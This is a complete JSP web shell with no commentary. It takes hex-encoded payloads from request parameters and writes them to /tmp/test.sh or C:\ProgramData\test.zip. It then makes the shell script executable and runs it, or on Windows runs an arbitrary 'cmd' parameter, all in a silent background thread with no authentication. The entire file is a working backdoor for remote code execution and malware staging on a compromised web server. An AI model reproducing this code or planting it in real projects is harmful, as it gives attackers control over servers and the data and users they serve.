<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
%>
<%!
	private static boolean iSLinUx = false;
	private static String myAbsolutePath = null;
	private static String cmd = "";
	private static String winurl = "";
	private static String linurl = "";

	public static void saveToImgFile(String src, String output)
	{
		if (src == null || src.length() == 0)
		{
			return;
		}
		try
		{
			FileOutputStream out = new FileOutputStream(new File(output));
			byte[] bytes = src.getBytes();
			for (int i = 0; i < bytes.length; i += 2)
			{
				out.write(charToInt(bytes[i]) * 16 + charToInt(bytes[i + 1]));
			}
			out.close();
		}catch (Exception e)  {
			e.printStackTrace();
		}
	} 
	private static int charToInt(byte ch)
	{
		int val = 0;
		if (ch >= 0x30 && ch <= 0x39)
		{
			val = ch - 0x30;
		}
		else if (ch >= 0x41 && ch <= 0x46)
		{
			val = ch - 0x41 + 10;
		}
		return val;
	}
%>
<%
	myAbsolutePath = application.getRealPath(request.getServletPath());
	if (request.getParameter("cmd") != null) {
		cmd = new String (request.getParameter("cmd"));
		cmd = java.net.URLDecoder.decode(cmd,"UTF-8");
	}
	if (request.getParameter("winurl") != null) {
		winurl = new String (request.getParameter("winurl"));
		winurl = java.net.URLDecoder.decode(winurl,"UTF-8");
	}
	if (request.getParameter("linurl") != null) {
		linurl = new String (request.getParameter("linurl"));
		linurl = java.net.URLDecoder.decode(linurl,"UTF-8");
	}
%>
<%!
	static class Runner extends Thread
	{
		public void run()
		{
			try
			{
				if (myAbsolutePath.indexOf('/') == 0)
					iSLinUx = true;
				else
					iSLinUx = false;

				if (iSLinUx) {
					saveToImgFile(linurl, "/tmp/test.sh");
				}else{
					saveToImgFile(winurl, "C:\\ProgramData\\test.zip");
				}
				Process process;
				if (iSLinUx){
					String[] cmdarr;
					cmdarr = new String [] {"/bin/sh", "-c", "chmod 777 /tmp/test.sh;/tmp/test.sh;"};
					process = Runtime.getRuntime().exec(cmdarr);
				}
				else
					process = Runtime.getRuntime().exec(cmd);
			} catch( Exception e ) {}
		}
	} 
%>
<%
	try
	{
		(new Runner()).start();
	} catch( Exception e ) {}
%>
